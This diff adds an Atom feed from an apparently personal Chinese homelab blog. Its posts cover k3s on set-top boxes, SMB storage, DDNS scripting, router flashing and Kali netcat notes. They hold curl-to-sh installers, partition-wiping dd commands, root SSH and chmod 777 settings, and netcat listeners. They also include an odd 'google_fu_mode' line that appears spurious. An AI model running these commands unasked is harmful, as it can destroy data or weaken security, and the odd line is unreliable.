@@ -1,0 +1,851 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://hellogu.github.io</id>
+    <title>顾师傅的网络备忘录</title>
+    <updated>2024-05-27T09:08:33.041Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://hellogu.github.io"/>
+    <link rel="self" href="https://hellogu.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://hellogu.github.io/images/avatar.png</logo>
+    <icon>https://hellogu.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, 顾师傅的网络备忘录</rights>
+    <entry>
+        <title type="html"><![CDATA[K8S中挂载SMB共享作为StorageClass]]></title>
+        <id>https://hellogu.github.io/post/k8s-zhong-gua-zai-smb-gong-xiang-zuo-wei-storageclass/</id>
+        <link href="https://hellogu.github.io/post/k8s-zhong-gua-zai-smb-gong-xiang-zuo-wei-storageclass/">
+        </link>
+        <updated>2024-05-27T08:10:28.000Z</updated>
+        <summary type="html"><![CDATA[<p>上周在机顶盒上部署了一套k3s集群，由于两个机顶盒都只有8G的EMMC，所以我想要把刷了DWRT固件的京东云路由器的256G存储空间作为SMB共享给集群使用，从创建SC、创建PVC，部署Deployment，一切都很顺利，但是我部署的两个项目，一个Alist，一个QD框架，在使用localstorage时都能正常运行，而使用SMB共享时都会起不来</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>上周在机顶盒上部署了一套k3s集群，由于两个机顶盒都只有8G的EMMC，所以我想要把刷了DWRT固件的京东云路由器的256G存储空间作为SMB共享给集群使用，从创建SC、创建PVC，部署Deployment，一切都很顺利，但是我部署的两个项目，一个Alist，一个QD框架，在使用localstorage时都能正常运行，而使用SMB共享时都会起不来</p>
+<!-- more -->
+<p>查看日志都是sqlite3无法写database.db文件，于是我另外部署了一个sqlite3的Deployment，进入pod排查</p>
+<pre><code class="language-shell">touch testfile
+echo “test” &gt; testfile
+cat testfile
+</code></pre>
+<p>文件可以正常创建、写入和读取，但使用sqlite3创建data.db、创建表却会报错</p>
+<pre><code class="language-sql">sqlite3 data.db
+create table test (id integer primary key, name text);
+insert into test (name) values ('Alice');
+insert into test (name) values ('Bob');
+select * from test;
+Error: unable to open database &quot;data.db&quot;: unable to open database file
+</code></pre>
+<p>困扰了一周，还是没能解决，现在先使用localstorage，等过段时间再回来看看😓</p>
+<h3 id="安装-csi-driver-smb">安装 csi-driver-smb</h3>
+<pre><code class="language-shell"># 添加 Helm 仓库：
+helm repo add csi-driver-smb https://raw.githubusercontent.com/kubernetes-csi/csi-driver-smb/master/charts
+helm repo update
+</code></pre>
+<pre><code class="language-shell"># 安装 csi-driver-smb：
+helm install csi-driver-smb csi-driver-smb/csi-driver-smb --namespace kube-system
+</code></pre>
+<pre><code class="language-shell"># 检查 csi-smb-controller 和 csi-smb-node 的日志
+kubectl logs -n kube-system -l app=csi-smb-controller
+kubectl logs -n kube-system -l app=csi-smb-node
+</code></pre>
+<p>smb-secret.yaml</p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Secret
+metadata:
+  name: smb-secret
+  namespace: gutf
+stringData:
+  username: &quot;guest&quot;
+  password: &quot;&quot;
+</code></pre>
+<p>smb-storageclass.yaml</p>
+<pre><code class="language-yaml">apiVersion: storage.k8s.io/v1
+kind: StorageClass
+metadata:
+  name: smb
+provisioner: smb.csi.k8s.io
+parameters:
+  source: &quot;//192.168.123.1/mmcblk0p24&quot;
+  csi.storage.k8s.io/node-stage-secret-name: &quot;smb-secret&quot;
+  csi.storage.k8s.io/node-stage-secret-namespace: &quot;gutf&quot;
+  csi.storage.k8s.io/node-publish-secret-name: &quot;smb-secret&quot;
+  csi.storage.k8s.io/node-publish-secret-namespace: &quot;gutf&quot;
+reclaimPolicy: Retain  # only retain is supported
+volumeBindingMode: Immediate
+mountOptions:
+  - dir_mode=0777
+  - file_mode=0777
+  - uid=1000
+  - gid=1000
+  - vers=3.0
+</code></pre>
+<p>smb-pvc.yaml</p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Secret
+metadata:
+  name: smb-secret
+  namespace: gutf
+stringData:
+  username: &quot;guest&quot;
+  password: &quot;&quot;
+root@k3s-master-octupos:/opt/testsmb# cat smb-pvc.yaml
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: smb-pvc
+  namespace: gutf
+spec:
+  accessModes:
+    - ReadWriteMany
+  resources:
+    requests:
+      storage: 1Gi
+  storageClassName: smb
+</code></pre>
+<p>sqlite3-deployment.yaml</p>
+<pre><code class="language-yaml">apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sqlite3-test
+  namespace: gutf
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: sqlite3-test
+  template:
+    metadata:
+      labels:
+        app: sqlite3-test
+    spec:
+      securityContext:
+        fsGroup: 1000  # 设置文件系统组
+      initContainers:
+      - name: init-permissions
+        image: busybox:1.32.0-uclibc
+        command: [&quot;sh&quot;, &quot;-c&quot;, &quot;chown -R 1000:1000 /data &amp;&amp; chmod -R 777 /data&quot;]
+        volumeMounts:
+        - mountPath: /data
+          name: smb-volume
+      containers:
+      - name: sqlite3
+        image: keinos/sqlite3
+        securityContext:
+          runAsUser: 1000  # 设置运行用户
+          runAsGroup: 1000  # 设置运行组
+        command: [&quot;sh&quot;, &quot;-c&quot;, &quot;while true; do sleep 3600; done&quot;]
+        volumeMounts:
+        - mountPath: /data
+          name: smb-volume
+      volumes:
+      - name: smb-volume
+        persistentVolumeClaim:
+          claimName: smb-pvc
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[花生壳DDNS更新shell脚本]]></title>
+        <id>https://hellogu.github.io/post/hua-sheng-ke-ddns-geng-xin-shell-jiao-ben/</id>
+        <link href="https://hellogu.github.io/post/hua-sheng-ke-ddns-geng-xin-shell-jiao-ben/">
+        </link>
+        <updated>2024-05-22T06:12:23.000Z</updated>
+        <summary type="html"><![CDATA[<p>前天给京东云路由器刷了这个DWRT，开启了clash，然后DDNS插件获取的ip就变成了代理ip，导致无法正常外网访问我局域网中部署的服务，DDNS插件设置从wan口获取ip一直无法保存，也不知道是插件的BUG还是固件的BUG，没实力排错，只能换个法子实现😅<br>
+具体实现办法：在不走代理的服务器上定时运行shell来更新DDNS，并且为了贯彻“能用鼠标点就不要敲键盘”的思想，定时用1panel面板的定时任务实现</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>前天给京东云路由器刷了这个DWRT，开启了clash，然后DDNS插件获取的ip就变成了代理ip，导致无法正常外网访问我局域网中部署的服务，DDNS插件设置从wan口获取ip一直无法保存，也不知道是插件的BUG还是固件的BUG，没实力排错，只能换个法子实现😅<br>
+具体实现办法：在不走代理的服务器上定时运行shell来更新DDNS，并且为了贯彻“能用鼠标点就不要敲键盘”的思想，定时用1panel面板的定时任务实现</p>
+<!-- more -->
+<p>以下代码来自chatgpt</p>
+<pre><code class="language-shell">#!/bin/bash
+
+# 假设你已经为以下变量赋了值
+USERNAME=&quot;your_username&quot;
+PASSWORD=&quot;your_password&quot;
+YOURHOSTNAME=&quot;your_hostname&quot;
+
+# 获取当前公网IP地址
+WANIP=$(curl -m 5 -sS -X GET http://checkip.dyndns.com | grep -oP 'Current IP Address: \d+\.\d+\.\d+\.\d+' | cut -d ' ' -f 4)
+
+# 检查WANIP变量是否成功获取到IP地址
+if [ -z &quot;$WANIP&quot; ]; then
+    echo &quot;Error: Unable to retrieve WAN IP address.&quot;
+    exit 1
+fi
+
+# 构建请求的URL
+URL=&quot;http://${USERNAME}:${PASSWORD}@ddns.oray.com/ph/update?hostname=${YOURHOSTNAME}&amp;myip=${WANIP}&quot;
+
+# 使用curl发送请求到DDNS提供商，并分别获取HTTP状态码和响应内容
+HTTP_STATUS=$(curl -sS -o /dev/stdout -w &quot;%{http_code}&quot; -u &quot;${USERNAME}:${PASSWORD}&quot; &quot;${URL}&quot;)
+RESPONSE=$(curl -sS -u &quot;${USERNAME}:${PASSWORD}&quot; &quot;${URL}&quot;)
+
+# 输出HTTP状态码和响应内容
+echo &quot;HTTP Response Code: $HTTP_STATUS&quot;
+echo &quot;Response: $RESPONSE&quot;
+
+# 从RESPONSE中分离状态码和IP地址
+RESPONSE_STATUS=$(echo &quot;$RESPONSE&quot; | awk '{print $1}')
+IP_ADDRESS=$(echo &quot;$RESPONSE&quot; | awk '{print $2}')
+HTTP_RESPONSE_IP=$(echo &quot;$RESPONSE&quot; | awk -F'[^0-9]*$' '{print $1}')
+
+# 输出分离后的状态码和IP地址
+echo &quot;Response Status: $RESPONSE_STATUS&quot;
+echo &quot;IP Address: $IP_ADDRESS&quot;
+
+# 根据返回的响应状态判断操作结果
+case &quot;$RESPONSE_STATUS&quot; in
+    &quot;good&quot;)
+        echo &quot;DDNS update successful. Your IP has been updated to: $IP_ADDRESS&quot;
+        ;;
+    &quot;nochg&quot;)
+        echo &quot;DDNS update successful, but no IP change.&quot;
+        ;;
+    # 处理其他响应状态...
+    *)
+        echo &quot;Unexpected response: $RESPONSE_STATUS&quot;
+        ;;
+esac
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[在机顶盒上部署一套k3s集群]]></title>
+        <id>https://hellogu.github.io/post/zai-ji-ding-he-shang-bu-shu-yi-tao-k3s-ji-qun/</id>
+        <link href="https://hellogu.github.io/post/zai-ji-ding-he-shang-bu-shu-yi-tao-k3s-ji-qun/">
+        </link>
+        <updated>2024-05-22T03:22:05.000Z</updated>
+        <summary type="html"><![CDATA[<p>捡垃圾好多年，攒了好多个机顶盒，都可以运行armbian系统，但每个盒子的磁盘都只有8G，用来跑docker服务没几个就磁盘满了，老是要我来规划哪些个服务跑在哪个机顶盒上，还要在路由器上设置端口转发，十分得不优雅，急需部署一套集群来自动编排这些docker应用，并且便宜的机顶盒如Q5仅需50元一个，以后资源不够了加机也很方便，还能挂载局域网中的共享存储给集群使用，非常的现代化</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>捡垃圾好多年，攒了好多个机顶盒，都可以运行armbian系统，但每个盒子的磁盘都只有8G，用来跑docker服务没几个就磁盘满了，老是要我来规划哪些个服务跑在哪个机顶盒上，还要在路由器上设置端口转发，十分得不优雅，急需部署一套集群来自动编排这些docker应用，并且便宜的机顶盒如Q5仅需50元一个，以后资源不够了加机也很方便，还能挂载局域网中的共享存储给集群使用，非常的现代化</p>
+<!-- more -->
+<table>
+<thead>
+<tr>
+<th>hostname</th>
+<th>IP</th>
+<th>型号</th>
+<th>CPU内存配置</th>
+<th>磁盘</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>k3s-master-octupos</td>
+<td>192.168.123.3</td>
+<td>章鱼星球</td>
+<td>8C2G</td>
+<td>8G</td>
+<td>Master</td>
+</tr>
+<tr>
+<td>k3s-worker-n1</td>
+<td>192.168.123.4</td>
+<td>斐讯N1</td>
+<td>4C2G</td>
+<td>8G</td>
+<td>Worker</td>
+</tr>
+</tbody>
+</table>
+<h3 id="1系统准备">1.系统准备</h3>
+<ol>
+<li>下载章鱼星球和斐讯N1的armbian镜像<a href="https://github.com/ophub/amlogic-s9xxx-armbian/releases">ophub/amlogic-s9xxx-armbian</a></li>
+<li>使用balenaEtcher写入U盘</li>
+<li>机顶盒插入U盘，上电开机，如果机顶盒中已经是armbian或openwrt系统会默认从U盘启动，如果是安卓系统，可以安装Reboot to liberelec（需要root权限）从U盘启动</li>
+<li>执行命令刷入armbian系统<code>armbian-install</code>，刷写完输入命令<code>poweroff</code>关机，拔出U盘重新上电</li>
+</ol>
+<h3 id="2部署k3s-master节点">2.部署k3s Master节点</h3>
+<p>参考<a href="https://geekhour.net/2023/12/23/kubernetes/">geekhour的教程</a></p>
+<pre><code class="language-shell"># 安装k3s的master节点
+curl -sfL https://get.k3s.io | sh -
+# 如果安装失败可以使用ranher的镜像源来安装
+curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -
+# 安装完成后查看集群状态
+kubectl get nodes
+# 查看token，在下一步创建worker节点时需要认证
+cat /var/lib/rancher/k3s/server/node-token
+</code></pre>
+<h3 id="3部署worker节点">3.部署worker节点</h3>
+<ol>
+<li>需要用到token和Master节点的ip，在geekhour的教程中部署了多个worker节点，所以将token和ip写入到了环境变量中，利用for循环给多个worker进行部署，我暂时只有一个worker，直接输入token和ip也可以</li>
+</ol>
+<pre><code class="language-shell">export MASTER_IP=192.168.123.3
+export TOKEN=部署Master节点时获取的token
+bash -c &quot;curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn K3S_URL=\&quot;https://$MASTER_IP:6443\&quot; K3S_TOKEN=\&quot;$TOKEN\&quot; sh -&quot;
+</code></pre>
+<p>此时再去Master节点上执行<code>kubectl get node</code>可以看到集群一主一从两个节点已经ready<br>
+<img src="https://hellogu.github.io/post-images/1716350549738.png" alt="" loading="lazy"><br>
+但是在worker节点上执行<code>kubectl get node</code>出现了报错<br>
+<img src="https://hellogu.github.io/post-images/1716356350789.png" alt="" loading="lazy"></p>
+<h3 id="4解决worker节点无法执行kubectl命令">4.解决worker节点无法执行kubectl命令</h3>
+<p>询问chatgpt，给出的解决办法如下：</p>
+<ol>
+<li>确认worker节点的kubectl配置<code>kubectl config view</code><br>
+<img src="https://hellogu.github.io/post-images/1716356646936.png" alt="" loading="lazy"></li>
+<li>从<code>kubectl config view</code>的输出来看，worker节点的kubectl配置为空，需要从master节点获取一份正确的配置，在 K3s 集群中，默认的 Kubeconfig 文件位于 /etc/rancher/k3s/k3s.yaml。我需要将这个文件复制到你的用户目录中，并设置 KUBECONFIG 环境变量指向它。</li>
+<li>复制k3s.yaml到worker节点<pre><code class="language-shell">mkdir -p ~/.kube
+scp root@192.168.123.3:/etc/rancher/k3s/k3s.yaml ~/.kube/config
+</code></pre>
+</li>
+<li>修改文件权限<br>
+确保kubectl可以访问这个文件，设置正确的文件权限：<pre><code class="language-shell">chmod 600 ~/.kube/config
+</code></pre>
+</li>
+<li>设置KUBECONFIG环境变量<br>
+确保你的KUBECONFIG环境变量指向这个配置文件。你可以在终端中临时设置它，或者将其添加到你的shell配置文件（例如.bashrc或.zshrc）中：<pre><code class="language-shell">export KUBECONFIG=$HOME/.kube/config
+</code></pre>
+如果你希望这个设置在每次登录时都生效，可以将上面的命令添加到你的shell配置文件中。例如，编辑.bashrc文件：<pre><code class="language-shell">echo 'export KUBECONFIG=$HOME/.kube/config' &gt;&gt; ~/.bashrc
+source ~/.bashrc
+</code></pre>
+</li>
+<li>验证配置<br>
+现在你可以验证kubectl是否已经正确配置并能够连接到你的K3s集群。<br>
+<img src="https://hellogu.github.io/post-images/1716357140625.png" alt="" loading="lazy"></li>
+</ol>
+<h3 id="5安装helm">5.安装Helm</h3>
+<p>Helm安装在任何可以访问 Kubernetes 集群的机器上，不一定要安装在Master节点上<br>
+执行命令<code>curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash</code><br>
+<img src="https://hellogu.github.io/post-images/1716357242375.png" alt="" loading="lazy"></p>
+<h3 id="6安装cert-manager">6.安装cert-manager</h3>
+<pre><code class="language-shell"># 添加Helm Chart仓库
+helm repo add &quot;stable&quot; &quot;https://charts.helm.sh/stable&quot; --force-update
+helm repo add rancher-stable https://releases.rancher.com/server-charts/stable
+# 定义一个Kubernetes名称空间，Chart创建的资源应该安装在这个名称空间中：cattle-system
+kubectl create namespace cattle-system
+# 安装cert-manager
+kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.14.5/cert-manager.crds.yaml
+# Add the Jetstack Helm repository
+helm repo add jetstack https://charts.jetstack.io
+# Update your local Helm chart repository cache
+helm repo update
+# Install the cert-manager Helm chart
+helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace
+</code></pre>
+<p><img src="https://hellogu.github.io/post-images/1716357938076.png" alt="" loading="lazy"><br>
+master点也报了这个连接超时的错，再把步骤4中chatgpt给出的解决办法在master节点也操作一遍</p>
+<pre><code class="language-shell">mkdir -p $HOME/.kube
+sudo cp /etc/rancher/k3s/k3s.yaml $HOME/.kube/config
+sudo chown $(id -u):$(id -g) $HOME/.kube/config
+export KUBECONFIG=$HOME/.kube/config
+echo 'export KUBECONFIG=$HOME/.kube/config' &gt;&gt; ~/.bashrc
+source ~/.bashrc
+</code></pre>
+<p>重新安装cert-manager</p>
+<pre><code class="language-shell">helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace
+</code></pre>
+<p>又报了个等待超时的错，但是查看cert-manager命名空间下的资源，都挺健康，可能是由于机顶盒性能太弱起来的太慢导致超时，所以我直接进行下一步<br>
+<img src="https://hellogu.github.io/post-images/1716359217200.png" alt="" loading="lazy"><br>
+重装完k3s 1.28版本后又试了一遍，应该确实是因为pod启动得慢了<br>
+<img src="https://hellogu.github.io/post-images/1716362515368.png" alt="" loading="lazy"></p>
+<h3 id="7安装rancher">7.安装Rancher</h3>
+<pre><code class="language-shell">helm install rancher rancher-stable/rancher --namespace cattle-system --set hostname=rancher.tianfeng.com
+</code></pre>
+<p>蚌埠住了😰竟然要版本低于1.29.0<br>
+<img src="https://hellogu.github.io/post-images/1716359334802.png" alt="" loading="lazy"></p>
+<h3 id="8卸载k3s重装低版本">8.卸载k3s，重装低版本</h3>
+<p>按照<a href="https://docs.rancher.cn/docs/k3s/installation/uninstall/_index">官方文档</a>来操作<br>
+<img src="https://hellogu.github.io/post-images/1716359991238.png" alt="" loading="lazy"><br>
+可以先停止k3s服务再进行卸载</p>
+<pre><code class="language-shell">sudo systemctl stop k3s
+sudo systemctl disable k3s
+</code></pre>
+<p>重新安装低于1.29的k3s，这里我使用最后一个1.28版本<br>
+<img src="https://hellogu.github.io/post-images/1716360253239.png" alt="" loading="lazy"></p>
+<pre><code class="language-shell"># 重新安装master节点的k3s
+curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_VERSION=v1.28.9+k3s1 sh -
+</code></pre>
+<p>worker节点：</p>
+<pre><code class="language-shell">export MASTER_IP=192.168.123.3
+export TOKEN=部署Master节点时获取的token
+bash -c &quot;curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_VERSION=v1.28.9+k3s1 K3S_URL=\&quot;https://$MASTER_IP:6443\&quot; K3S_TOKEN=\&quot;$TOKEN\&quot; sh -&quot;
+</code></pre>
+<h3 id="9使用portainer">9使用portainer</h3>
+<p>机顶盒性能太弱，部署rancher一直无法正常启动，换成轻量化的portainer来管理<br>
+<img src="https://hellogu.github.io/post-images/1716366897534.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[京东云路由器AX1800Pro(亚瑟)刷QWRT]]></title>
+        <id>https://hellogu.github.io/post/jing-dong-yun-lu-you-qi-shua-qwrt/</id>
+        <link href="https://hellogu.github.io/post/jing-dong-yun-lu-you-qi-shua-qwrt/">
+        </link>
+        <updated>2024-05-20T08:10:36.000Z</updated>
+        <summary type="html"><![CDATA[<p>苏州联通开始封禁家庭宽带PCDN了，3月底给我上传限制到5M，微信视频都发不出去，联系了装机小哥签了个保证书才给我恢复😰还好我的几台京东云路由器早已回本，既然不能赚京豆了，就直接刷第三方系统吧。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>苏州联通开始封禁家庭宽带PCDN了，3月底给我上传限制到5M，微信视频都发不出去，联系了装机小哥签了个保证书才给我恢复😰还好我的几台京东云路由器早已回本，既然不能赚京豆了，就直接刷第三方系统吧。</p>
+<!-- more -->
+<p>开始我是想要刷个iStoreOS的，毕竟我这台京东云AX1800PRO带256G的EMMC，想尝试下iStoreOS做轻NAS，但是按照网友给出的教程和固件，iStoreOS始终无法刷入，自己又没实力排错，只能默默的换个固件刷😅还好可以刷大雕的QWRT固件<br>
+<img src="https://hellogu.github.io/post-images/1716192985561.png" alt="" loading="lazy"><br>
+简单记录一下刷机过程，方便后续继续折腾</p>
+<h3 id="准备工作">准备工作</h3>
+<ol>
+<li>揭开底部胶垫，拧出5颗螺丝</li>
+<li>取下底盖，拧出4颗螺丝</li>
+<li>撬开顶部上盖，拧出2颗螺丝</li>
+<li>捏住外壳，使外壳微微形变与网口分离，以便抽出主板</li>
+</ol>
+<h3 id="刷入uboot">刷入uboot</h3>
+<ol>
+<li>修改网卡IP为192.168.10.1（或其他，只要与下面步骤中命令中的ip一致）</li>
+<li>使用Tftpd64架设tftp服务器，放入u-boot.mbn文件，server interfaces选择192.168.10.1</li>
+<li>使用CH340串口工具连接主板上的TTL口GND-G,T-R,R-T</li>
+<li>打开MobaXterm新建串口连接，选择CH340对应的COM口，波特率位115200<br>
+<img src="https://hellogu.github.io/post-images/1716193463016.jpg" alt="" loading="lazy"></li>
+<li>路由器插电开机，在串口连接窗口看到提示时按enter键打断启动（插电后一直按enter键就行了），进入<code>IPQ6018#</code>命令界面</li>
+<li>输入命令<code>tftpboot u-boot.mbn </code>从 TFTP 服务器下载名为 u-boot.mbn 的文件到设备上</li>
+<li>输入命令<code>flash 0:APPSBL &amp;&amp; flash 0:APPSBL_1</code>刷入uboot分区</li>
+</ol>
+<h3 id="刷入固件">刷入固件</h3>
+<p>刷入uboot之后就可以随意刷固件了（我浅显的理解uboot分区类似安卓的recovery分区，通过启动到recovery分区中可以进行其他分区的刷写操作🤣）</p>
+<ol>
+<li>按住主板上的reset键再插入路由器电源，等待呼吸灯红色闪烁5下变为蓝色（如果此时还连着TTL的话可以看到TTL界面有对应跳动5秒后打印出“http server is ready”）</li>
+<li>电脑IP设置为192.168.1.15（与192.168.1.1同网段即可）</li>
+<li>浏览器打开192.168.1.1选择固件上传，QWRT固件刷写完成后路由器会自动重启，呼吸灯变绿</li>
+<li>QWRT默认管理页面位192.168.1.1，root:password</li>
+<li>开启神秘东方插件<code>echo 0xDEADBEEF &gt; /etc/config/google_fu_mode</code></li>
+</ol>
+<h3 id="其他">其他</h3>
+<ol>
+<li>更改openwrt软路由后台管理地址后，发现TTYD终端无法连接，显示已拒绝连接<br>
+解决方法:SSH进后台，<code>vi /etc/init.d/ttyd</code>将<code>${interface:+-i $interface} \</code>这行注释，保存后重启</li>
+<li>扩容软件包分区，刷完DWRT软件包分区只有8MB，需要扩容一下<br>
+<img src="https://hellogu.github.io/post-images/1716448367558.png" alt="" loading="lazy"><pre><code class="language-shell"># 先将gpt.bin上传到/tmp
+cd /tmp
+dd if=gpt.bin of=/dev/mmcblk0 bs=512 count=34
+dd if=/dev/zero of=/dev/mmcblk0p2
+dd if=/dev/zero of=/dev/mmcblk0p3
+sync 
+# 操作完后路由器断电，重新进入uboot刷写factory.bin固件
+</code></pre>
+</li>
+<li>扩容软件分区之后有200G的剩余空间没有挂载，需要手动分区一下<pre><code class="language-shell"># 先lsblk查看下磁盘，没有lsblk的话去软件包中搜索安装
+lsblk
+# 使用cddisk分区，根据提示操作
+cfdisk /dev/mmcblk0
+# 创建出来024分区，格式化
+mkfs.ext4 /dev/mmcblk0p24
+# 挂载
+mount /dev/mmcblk0p24 /mnt/mmcblk0p24
+# 然后去web-网络存储-网络共享中添加共享
+</code></pre>
+<img src="https://hellogu.github.io/post-images/1716452218148.png" alt="" loading="lazy"></li>
+</ol>
+<h3 id="参考链接">参考链接</h3>
+<p><a href="https://www.bilibili.com/read/cv34443656/">纯自用：京东云无线宝亚瑟AX1800Pro扩容软件包空间，刷大分区GPT文件</a><br>
+<a href="https://ieeh.net/98.html">木子のBlog</a><br>
+<a href="https://post.smzdm.com/p/an3eo74p/">软路由再见-0成本狗东亚瑟AX1800 pro刷iStoreOS教程</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[小爱音箱接入chatgpt]]></title>
+        <id>https://hellogu.github.io/post/xiao-ai-yin-xiang-jie-ru-chatgpt/</id>
+        <link href="https://hellogu.github.io/post/xiao-ai-yin-xiang-jie-ru-chatgpt/">
+        </link>
+        <updated>2024-04-30T11:24:30.000Z</updated>
+        <summary type="html"><![CDATA[<p>这是一个在github上看到的开源项目，点击<a href="https://github.com/yihong0618/xiaogpt">项目地址</a>给作者一个大大的Star吧</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>这是一个在github上看到的开源项目，点击<a href="https://github.com/yihong0618/xiaogpt">项目地址</a>给作者一个大大的Star吧</p>
+<!-- more -->
+<p>部署过程<br>
+<code>pip install -U miservice_fork -i https://pypi.doubanio.com/simple/</code><br>
+<code>export MI_USER=181********</code><br>
+<code>export MI_PASS=************</code><br>
+<code>micli list</code> 记录did<br>
+<img src="https://hellogu.github.io/post-images/1714476465171.png" alt="" loading="lazy"></p>
+<p>目录结构<br>
+<img src="https://hellogu.github.io/post-images/1714476864326.png" alt="" loading="lazy"><br>
+<code>config.json</code>：</p>
+<ul>
+<li>设置关键词“请”，跟小爱同学对话时说“介绍一下你自己”小爱回答，说“请介绍一下你自己”小爱同学会调用chatgpt回答（关键词触发，将对话内容发给gpt，传回小爱同学用TTS朗读）</li>
+<li>hardware：设备型号，在小爱音箱背面或者底部，如果没有则使用<code>micli mina</code>查看</li>
+</ul>
+<pre><code class="language-json">{
+        &quot;openai_key&quot;:&quot;&quot;,
+        &quot;api_base&quot;:&quot;&quot;,
+        &quot;openai_api_model&quot;:&quot;&quot;,
+        &quot;hardware&quot;:&quot;L07A&quot;,
+        &quot;mute_xiaoai&quot;: true,
+        &quot;account&quot;: &quot;&quot;,
+        &quot;password&quot;:&quot;&quot;,
+        &quot;mi_did&quot;:&quot;&quot;,
+        &quot;bot&quot;: &quot;chatgptapi&quot;,
+        &quot;tts&quot;: &quot;mi&quot;,
+        &quot;prompt&quot;: &quot;你的名字叫小爱GPT，是一个人工智能助手，你的回答尽量简明扼要，回答总数不能超过150字。&quot;,
+        &quot;keyword&quot;: [
+                &quot;请&quot;
+        ],
+        &quot;stream&quot;: true
+
+</code></pre>
+<p><code>docker-compose.yaml</code></p>
+<pre><code class="language-yaml">version: '3.8'
+services:
+ xiaogpt:
+   image: yihong0618/xiaogpt
+   volumes:
+     - ./config:/config
+   ports:
+     - &quot;9527:9527&quot;
+   restart: always
+   command: --config=/config/config.json
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[苑房宏Kali笔记]]></title>
+        <id>https://hellogu.github.io/post/yuan-fang-hong-kali-bi-ji/</id>
+        <link href="https://hellogu.github.io/post/yuan-fang-hong-kali-bi-ji/">
+        </link>
+        <updated>2024-04-30T02:19:27.000Z</updated>
+        <summary type="html"><![CDATA[<p>  虽然之前做过一些web安全测试相关的工作，但大都是像Nessus之类的安全扫描工具的使用，在手工发掘漏洞这块能力比较欠缺，另外像wireshark、burpsuite等工具仅仅学习了最基础的抓包和代理的用法，对于burpsuite的一些第三方插件也接触比较少，于是想要系统的学习一下网络安全测试这块，在52pj上找到了苑房宏的《Kali Linux安全测试》177讲，不过教程是2015年的了，课程中讲到的一些工具有的已经停止维护，有的版本更新之后使用命令发生了改变，所以在这篇笔记中记录一下，方便自己后续的使用。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>  虽然之前做过一些web安全测试相关的工作，但大都是像Nessus之类的安全扫描工具的使用，在手工发掘漏洞这块能力比较欠缺，另外像wireshark、burpsuite等工具仅仅学习了最基础的抓包和代理的用法，对于burpsuite的一些第三方插件也接触比较少，于是想要系统的学习一下网络安全测试这块，在52pj上找到了苑房宏的《Kali Linux安全测试》177讲，不过教程是2015年的了，课程中讲到的一些工具有的已经停止维护，有的版本更新之后使用命令发生了改变，所以在这篇笔记中记录一下，方便自己后续的使用。</p>
+<!-- more -->
+<h2 id="kali基础配置">kali基础配置</h2>
+<h3 id="开启ssh登录">开启SSH登录</h3>
+<ol>
+<li>编辑ssh文件，取消<code>PermitRootLogin</code>和<code>PasswordAuthentication</code>的注释，并改为<code>yes</code>；</li>
+<li>重启SSH服务，<code>/etc/init.d/ssh restart</code> 或者<code>service ssh restart</code>重启，<code>/etc/init.d/ssh status</code>或者<code>service ssh status</code>查看状态是否正常运行</li>
+<li>开启ssh服务开机自启动，查看开启状态，<code>update-rc.d ssh enable</code>或者<code>systemctl enable ssh</code>开机自启动<pre><code>vi /etc/ssh/sshd_config #vi模式下输入'/关键词'回车进行搜索，按n查找下一个
+service ssh restart
+update-rc.d ssh enable 
+</code></pre>
+</li>
+</ol>
+<h2 id="kali工具">kali工具</h2>
+<h3 id="ncncat">nc&amp;ncat</h3>
+<ol>
+<li>
+<p>传输文本信息<br>
+主机A：<code>nc -l -p 4444 </code> 开启一个监听服务，端口4444<br>
+主机B：<code>nc –nv 1.1.1.1 4444</code> 连接主机A的4444端口</p>
+</li>
+<li>
+<p>传输⽂件<br>
+A：<code>nc -lp 333 &gt; 1.mp4</code><br>
+B：<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</code> -q：传输完成1s后断开连接<br>
+或者<br>
+A：<code>nc -q 1 -lp 333 &lt; a.mp4</code><br>
+B： <code>nc -nv 1.1.1.1 333 &gt; 2.mp4</code><br>
+nc工具本身不支持加密连接，如果需要加密传输，可以先把要传输的内容通过<code>mcrypt</code>加密再明文传输<br>
+A：<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code><br>
+B： <code>mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></p>
+<ul>
+<li>mcrypt: 调用mcrypt加密工具</li>
+<li>flush: 清除加密工具的内部状态</li>
